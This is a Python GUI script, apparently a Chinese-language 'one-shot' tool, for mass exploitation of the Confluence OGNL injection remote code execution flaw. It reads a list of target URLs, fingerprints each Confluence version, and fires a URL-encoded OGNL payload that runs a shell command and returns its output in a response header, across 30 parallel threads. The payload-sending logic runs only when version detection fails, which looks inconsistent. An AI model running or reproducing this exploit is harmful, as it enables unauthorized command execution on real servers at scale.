import tkinter as tk
from concurrent.futures import ThreadPoolExecutor
from tkinter import scrolledtext
import requests
import re
from ttkbootstrap.constants import *
import urllib3
urllib3.disable_warnings()
def check_target_version(host):
    response = requests.get("{}/login.action".format(host), verify=False)
    if response.status_code == 200:
        filter_version = re.findall("<span id='footer-build-information'>.*</span>", response.text)
        if (len(filter_version) >= 1):
            version = filter_version[0].split("'>")[1].split('</')[0]
            return version
        else:
            return False
    else:
        return host
def send_payload(host, command):
    response = requests.get(
        "{}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/".format(
            host, command), verify=False, allow_redirects=False)
    if (response.status_code == 302):
        return response.headers['X-Cmd-Response']
    else:
        return False
def confluence_rce(target):
    cmd = "whoami"
    version = check_target_version(target)
    if version:
        confluence_text.insert(END,f"【+++】{target} Confluence target version: {version}\n")
        confluence_text.see(END)
    else:
        confluence_text.insert(END,f"【×××】Can't find the used version for {target}\n")
        confluence_text.see(END)
        exec_payload = send_payload(target, cmd)
        confluence_text.insert(END, f"【！！！！！！！！！！！！】{target}的执行结果为：" + exec_payload + "\n")
        confluence_text.see(END)
def get_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def confluence_gui():
    confluence = tk.Tk()
    confluence.geometry("1200x600")
    confluence.title("ConfulenceONGL RCE一把梭（启动可能有点卡，请耐心等待，不要关闭或者乱点）")
    confluence.resizable(0, 0)
    confluence.iconbitmap('logo.ico')
    global confluence_text
    confluence_text = scrolledtext.ScrolledText(confluence,width=165, height=33)
    confluence_text.grid(row=0, column=0, padx=10, pady=10)
    confluence_text.see(END)
    max_thread_num = 30
    addrs = get_addr()
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(confluence_rce, addr)
    confluence.mainloop()